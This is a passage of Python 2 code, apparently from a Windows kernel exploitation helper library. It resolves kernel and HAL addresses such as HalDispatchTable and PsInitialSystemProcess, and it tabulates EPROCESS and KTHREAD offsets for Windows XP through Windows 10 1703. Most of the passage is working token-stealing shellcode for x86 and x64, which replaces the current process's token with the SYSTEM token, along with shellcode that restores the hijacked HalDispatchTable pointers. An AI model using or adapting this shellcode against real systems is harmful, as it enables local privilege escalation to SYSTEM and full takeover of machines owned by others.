				return (base_addr, driver_name.value)
	return None	
 
#https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
def get_haldispatchtable():
 	if platform.architecture()[0] == '64bit':
		kernel32.LoadLibraryExA.restype = c_uint64
		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
		kernel32.GetProcAddress.restype = c_uint64
	(krnlbase, kernelver) = find_driver_base()
	hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
	HalDispatchTable = kernel32.GetProcAddress(hKernel, 'HalDispatchTable')
	HalDispatchTable -= hKernel
	HalDispatchTable += krnlbase
	print "[+] HalDispatchTable address:", hex(HalDispatchTable)
	return HalDispatchTable

def get_psinitialsystemprocess():	
 	if platform.architecture()[0] == '64bit':
		kernel32.LoadLibraryExA.restype = c_uint64
		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
		kernel32.GetProcAddress.restype = c_uint64
	(krnlbase, kernelver) = find_driver_base()
	print "[+] Loading %s in userland" % kernelver
	hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
	print "[+] %s base address : %s" % (kernelver, hex(hKernel))
	PsInitialSystemProcess = kernel32.GetProcAddress(hKernel, 'PsInitialSystemProcess')
	PsInitialSystemProcess -= hKernel
	PsInitialSystemProcess += krnlbase
	print "[+] PsInitialSystemProcess address: %s" % hex(PsInitialSystemProcess)
	return PsInitialSystemProcess

	
def get_haldisp_ofsetsx86():
	(halbase, dllname) = find_driver_base("hal.dll")
	version = sys.getwindowsversion()

	if((version.major == 5) and (version.minor == 1) and ('3' in version.service_pack)):
		# the target machine's OS is Windows XP SP3
		HaliQuerySystemInformation = halbase+0x16bba # Offset for XPSP3
		HalpSetSystemInformation   = halbase+0x19436 # Offset for XPSP3
	elif((version.major == 5) and (version.minor == 2) and ('2' in version.service_pack)):
		# the target machine's OS is Windows Server 2003 SP2
		HaliQuerySystemInformation = halbase+0x1fa1e # Offset for WIN2K3
		HalpSetSystemInformation   = halbase+0x21c60 # Offset for WIN2K3
	elif((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
		# the target machine's OS is Windows 7x86 SP1
		HaliQuerySystemInformation = halbase+0x278a2 # Offset for WIN7SP1x86
		HalpSetSystemInformation   = halbase+0x281b4 # Offset for WIN7SP1x86
	else:
		print "[-] No info about HaliQuerySystemInformation and HalpSetSystemInformation for this OS version"
		print "[-] Exiting..."
		sys.exit(-1)

	print "[+] HaliQuerySystemInformation address: %s" % hex(HaliQuerySystemInformation)
	print "[+] HalpSetSystemInformation address: %s" % hex(HalpSetSystemInformation)
	return (HaliQuerySystemInformation,HalpSetSystemInformation)

def get_haldisp_ofsetsx64():
	(halbase, dllname) = find_driver_base("hal.dll")
	version = sys.getwindowsversion()

	if((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
		# the target machine's OS is Windows 7x64 SP1
		HaliQuerySystemInformation = halbase+0x398e8 # Offset for win7 x64
	else:
		print "[-] No info about HaliQuerySystemInformation and HalpSetSystemInformation for this OS version"
		print "[-] Exiting..."
		sys.exit(-1)
		
	print "[+] HaliQuerySystemInformation address: %s" % hex(HaliQuerySystemInformation)
	print "[+] HalpSetSystemInformation address: %s" % hex(HalpSetSystemInformation) 
	return (HaliQuerySystemInformation,HalpSetSystemInformation)

def setosvariablesx86():
	"""
	Set various structure variables based on OS version
	@return: tuple of (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
	"""
	KTHREAD_Process = 0
	EPROCESS_ActiveProcessLinks = 0
	EPROCESS_UniqueProcessId = 0
	EPROCESS_Token = 0
	version = sys.getwindowsversion()

	if((version.major == 5) and (version.minor == 1) and ('3' in version.service_pack)):
		# the target machine's OS is Windows XP SP3
		print "[*] OS version: Windows XP SP3"
		KTHREAD_Process = 0x44
		EPROCESS_Token	= 0xc8
		EPROCESS_UniqueProcessId	 = 0x84
		EPROCESS_ActiveProcessLinks  = 0x88
 
	elif((version.major == 5) and (version.minor == 2) and ('2' in version.service_pack)):
		# the target machine's OS is Windows Server 2003 SP2
		print "[*] OS version: Windows Server 2003 SP2"
		KTHREAD_Process = 0x38
		EPROCESS_Token	= 0xD8
		EPROCESS_UniqueProcessId	 = 0x94
		EPROCESS_ActiveProcessLinks  = 0x98
 
	elif((version.major == 6) and (version.minor == 0) and ('1' in version.service_pack or '2' in version.service_pack) and (version.product_type == VER_NT_WORKSTATION)):
		# the target machine's OS is Windows Vista SP1 / SP2
		print "[*] OS version: Windows Vista SP1 / SP2"
		KTHREAD_Process = 0x48
		EPROCESS_Token	= 0xE0
		EPROCESS_UniqueProcessId	 = 0x9C
		EPROCESS_ActiveProcessLinks  = 0xA0
 
	elif((version.major == 6) and (version.minor == 0) and ('1' in version.service_pack or '2' in version.service_pack) and (version.product_type != VER_NT_WORKSTATION)):
		# the target machine's OS is Windows Server 2008 / SP2
		print "[*] OS version: Windows Server 2008 / SP2"
		KTHREAD_Process = 0x48
		EPROCESS_Token	= 0xE0
		EPROCESS_UniqueProcessId	 = 0x9C
		EPROCESS_ActiveProcessLinks  = 0xA0
 
	elif((version.major == 6) and (version.minor == 1)):
		# the target machine's OS is Windows 7 / SP1
		print "[*] OS version: Windows 7 / SP1"
		KTHREAD_Process = 0x50
		EPROCESS_Token	= 0xF8
		EPROCESS_UniqueProcessId	 = 0xB4
		EPROCESS_ActiveProcessLinks  = 0xB8
	
	else:
		print "[-] No matching OS version, exiting..."
		sys.exit(-1)
	
	return (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)

def setosvariablesx64():
	"""
	Set various structure variables based on OS version
	# kd> dt nt!_EPROCESS uniqueprocessid token activeprocesslinks
	# kd> dt nt!_KTHREAD ApcState; dt _KAPC_STATE process
	@return: tuple of (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
	"""
	KTHREAD_Process = 0
	EPROCESS_ActiveProcessLinks = 0
	EPROCESS_UniqueProcessId = 0
	EPROCESS_Token = 0
	version = sys.getwindowsversion()
	p = platform.platform()
	if((version.major == 5) and (version.minor == 2)):
		# the target machine's OS is Windows Server 2003
		print "[*] OS version: Windows Server 2003"
		KTHREAD_Process = 0x68
		EPROCESS_Token	= 0x160
		EPROCESS_UniqueProcessId = 0xd8
		EPROCESS_ActiveProcessLinks  = 0xe0
	elif p == 'Windows-7-6.1.7601-SP1':
		print "[*] OS version: Windows 7x64 SP1"
		KTHREAD_Process = 0x70
		EPROCESS_UniqueProcessId	 = 0x180
		EPROCESS_ActiveProcessLinks  = 0x188
		EPROCESS_Token	= 0x208
	elif p == 'Windows-8-6.2.9200-SP0':
		print "[*] OS version: Windows 8x64"
		KTHREAD_Process = 0xb8
		EPROCESS_UniqueProcessId	 = 0x2e0
		EPROCESS_ActiveProcessLinks  = 0x2e8
		EPROCESS_Token	= 0x348
	elif p == 'Windows-8.1-6.3.9600':
		print "[*] OS version: Windows 8.1x64"
		KTHREAD_Process = 0xb8
		EPROCESS_UniqueProcessId	 = 0x2e0
		EPROCESS_ActiveProcessLinks  = 0x2e8
		EPROCESS_Token	= 0x348
	elif p == 'Windows-10-10.0.10586':
		print "[*] OS version: Windows 10x64 v1511 November Update"
		KTHREAD_Process = 0xb8
		EPROCESS_UniqueProcessId = 0x2e8
		EPROCESS_ActiveProcessLinks = 0x2f0
		EPROCESS_Token = 0x358
	elif p == 'Windows-10-10.0.14393':
		print "[*] OS version: Windows 10x64 v1607 Anniversary Update"
		KTHREAD_Process = 0xb8
		EPROCESS_UniqueProcessId = 0x2e8
		EPROCESS_ActiveProcessLinks = 0x2f0
		EPROCESS_Token = 0x358
	elif p == 'Windows-10-10.0.15063':
		print "[*] OS version: Windows 10x64 v1703 Creators Update"
		KTHREAD_Process = 0xb8
		EPROCESS_UniqueProcessId = 0x2e0
		EPROCESS_ActiveProcessLinks = 0x2e8
		EPROCESS_Token = 0x358
	else:
		print "[-] No matching OS version, exiting..."
		sys.exit(-1)
		
	return (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)

def retore_hal_ptrs(HalDispatchTable,HaliQuerySystemInformation,HalpSetSystemInformation):
	"""
	Return a shellcode to retore HalDispatchTable ptrs
	"""
	if HaliQuerySystemInformation == 0x0 or HalpSetSystemInformation == 0x0:
		return ""
	else:
		shellcode = (
		"\x31\xc0"
		"\xb8" + struct.pack("L", HalpSetSystemInformation) +
		"\xa3" + struct.pack("L", HalDispatchTable + 0x8) +
		"\xb8" + struct.pack("L", HaliQuerySystemInformation) +
		"\xa3" + struct.pack("L", HalDispatchTable + 0x4)
		)
	
		return shellcode

def restoretokenx86(RETVAL, extra = ""):
	"""
	Create a token restore shellcode
	@param RETVAL: the value for the ASM RET instruction
	@return: token restore shellcode related to the platform
	"""
	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = setosvariablesx86()
	shellcode =  (
	"\x52"
	"\x33\xc0"														# xor	eax,eax
	"\x64\x8b\x80\x24\x01\x00\x00"									# mov	eax,DWORD PTR fs:[eax+0x124]
	"\x8b\x40" + struct.pack("B",KTHREAD_Process)  +				# mov	eax,DWORD PTR [eax+_KTHREAD_Process]
	"\x8b\x15\x00\x09\x02\x00"
	"\x89\x90" + struct.pack("B",EPROCESS_Token) + "\x00\x00\x00"	# mov	edx,DWORD PTR [eax+0xf8]
	"\x5a"
	)
	
	if RETVAL == "":
		shellcode += "\xc3"						#retn
	else:
		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
	
	return shellcode

#https://www.exploit-db.com/exploits/18176/ 
def tokenstealingx86(RETVAL, extra = ""):
	"""
	Create a token stealing shellcode for x86 platform
	@param RETVAL: the value for the ASM RET instruction
	@param extra: extra shellcode to put after tokenstealing (e.g.: restore stack)
	@return: token stealing shellcode related to the platform
	"""
	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = setosvariablesx86()
	shellcode = (
	"\x60"																			# pushad
	"\x33\xc0"																		# xor	eax,eax
	"\x64\x8b\x80\x24\x01\x00\x00"													# mov	eax,DWORD PTR fs:[eax+0x124]
	"\x8b\x40" + struct.pack("B",KTHREAD_Process) +									# mov	eax,DWORD PTR [eax+_KTHREAD_Process]
	"\x8b\xc8"																		# mov	ecx,eax
	"\x8b\x80" + struct.pack("B",EPROCESS_ActiveProcessLinks) + "\x00\x00\x00"		# mov	eax,DWORD PTR [eax+0xb8]
	"\x2d" + struct.pack("B",EPROCESS_ActiveProcessLinks) + "\x00\x00\x00"			# sub	eax,0xb8
	"\x83\xb8" + struct.pack("B",EPROCESS_UniqueProcessId) + "\x00\x00\x00\x04"		# cmp	DWORD PTR [eax+0xb4],0x4
	"\x75\xec"																		# jne	0xe
	"\x8b\x90" + struct.pack("B",EPROCESS_Token) + "\x00\x00\x00"					# mov	edx,DWORD PTR [eax+0xf8]
	"\x89\x91" + struct.pack("B",EPROCESS_Token) + "\x00\x00\x00"					# mov	DWORD PTR [ecx+0xf8],edx
	"\x61"																			# popad
	)
	
	shellcode += extra #append extra code after token stealing shellcode, e.g.: restore stack
	
	if RETVAL == "":
		shellcode += "\xc3"						#retn
	else:
		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
	
	return shellcode
	
def tokenstealingx64(RETVAL, extra = ""):
	"""
	Create a token stealing shellcode for x64 platform
	@param RETVAL: the value for the ASM RET instruction
	@param extra: extra shellcode to put after tokenstealing (e.g.: restore stack)
	@return: token stealing shellcode related to the platform
	"""
	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = setosvariablesx64()
	shellcode = (
	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"												# mov	 rax, [gs:0x188]		 ;Get current ETHREAD in
	"\x48\x8b\x40" + struct.pack("B",KTHREAD_Process) +									# mov	 rax, [rax+0x68]		 ;Get current KTHREAD_Process address
	"\x48\x89\xc1"																		# mov	 rcx, rax				;Copy current KTHREAD_Process address to RCX
	"\x48\x8b\x80" + struct.pack("H",EPROCESS_ActiveProcessLinks) + "\x00\x00"			# mov	 rax, [rax+0xe0]		 ;Next KTHREAD_Process ActivKTHREAD_ProcessLinks.Flink
	"\x48\x2d" + struct.pack("H",EPROCESS_ActiveProcessLinks) + "\x00\x00"				# sub	 rax, 0xe0			   ;Go to the beginning of the KTHREAD_Process structure
	"\x4c\x8b\x88" + struct.pack("H",EPROCESS_UniqueProcessId) + "\x00\x00"				# mov	 r9 , [rax+0xd8]		 ;Copy PID to R9
	"\x49\x83\xf9\x04"																	# cmp	 r9 , 0x4				;Compare R9 to SYSTEM PID (=4)
	"\x75\xe6"																			# jnz short find_system_process   ;If not SYSTEM got to next KTHREAD_Process
	"\x48\x8b\x90" + struct.pack("H",EPROCESS_Token) + "\x00\x00"						# mov	 rdx, [rax+0x160]		;Copy SYSTEM process token address to RDX
	"\x48\x89\x91" + struct.pack("H",EPROCESS_Token) + "\x00\x00"						# mov	 [rcx+0x160], rdx		;Steal token with overwriting our current process's token address
	)
	
	shellcode += extra #append extra code after token stealing shellcode, e.g.: restore stack

	if RETVAL == "":
		shellcode += "\xc3"						#retn
	else:
		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
	
	return shellcode

def tokenstealing(RETVAL, extra = ""):
	if sys.maxint > 2147483647: return tokenstealingx64(RETVAL, extra)
	else: return tokenstealingx86(RETVAL, extra)
	
